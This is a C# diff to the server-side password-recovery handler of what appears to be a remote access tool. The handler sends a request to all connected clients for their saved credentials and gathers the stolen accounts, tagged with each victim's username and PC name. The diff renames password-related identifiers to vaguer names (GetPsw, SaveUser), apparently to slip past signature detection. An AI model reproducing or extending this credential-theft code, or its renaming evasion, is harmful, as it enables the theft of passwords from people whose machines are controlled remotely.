@@ -23,7 +23,7 @@ namespace Comet.Server.Messages
         /// <param name="sender">The message processor which raised the event.</param>
         /// <param name="clientIdentifier">A unique client identifier.</param>
         /// <param name="accounts">The recovered accounts</param>
-        public delegate void AccountsRecoveredEventHandler(object sender, string clientIdentifier, List<RecoveredAccount> accounts);
+        public delegate void AccountsRecoveredEventHandler(object sender, string clientIdentifier, List<SaveUser> accounts);
 
         /// <summary>
         /// Raised when accounts got recovered.
@@ -39,12 +39,12 @@ namespace Comet.Server.Messages
         /// </summary>
         /// <param name="accounts">The recovered accounts.</param>
         /// <param name="clientIdentifier">A unique client identifier.</param>
-        private void OnAccountsRecovered(List<RecoveredAccount> accounts, string clientIdentifier)
+        private void OnAccountsRecovered(List<SaveUser> accounts, string clientIdentifier)
         {
             SynchronizationContext.Post(d =>
             {
                 var handler = AccountsRecovered;
-                handler?.Invoke(this, clientIdentifier, (List<RecoveredAccount>)d);
+                handler?.Invoke(this, clientIdentifier, (List<SaveUser>)d);
             }, accounts);
         }
 
@@ -58,7 +58,7 @@ namespace Comet.Server.Messages
         }
 
         /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is GetPasswordsResponse;
+        public override bool CanExecute(IMessage message) => message is GetPswsResponse;
 
         /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => _clients.Any(c => c.Equals(sender));
@@ -68,7 +68,7 @@ namespace Comet.Server.Messages
         {
             switch (message)
             {
-                case GetPasswordsResponse pass:
+                case GetPswsResponse pass:
                     Execute(sender, pass);
                     break;
             }
@@ -79,18 +79,18 @@ namespace Comet.Server.Messages
         /// </summary>
         public void BeginAccountRecovery()
         {
-            var req = new GetPasswords();
+            var req = new GetPsw();
             foreach (var client in _clients.Where(client => client != null))
                 client.Send(req);
         }
 
-        private void Execute(ISender client, GetPasswordsResponse message)
+        private void Execute(ISender client, GetPswsResponse message)
         {
             Client c = (Client) client;
 
             string userAtPc = $"{c.Value.Username}@{c.Value.PcName}";
 
-            OnAccountsRecovered(message.RecoveredAccounts, userAtPc);
+            OnAccountsRecovered(message.SaveUsers, userAtPc);
         }
     }
 }
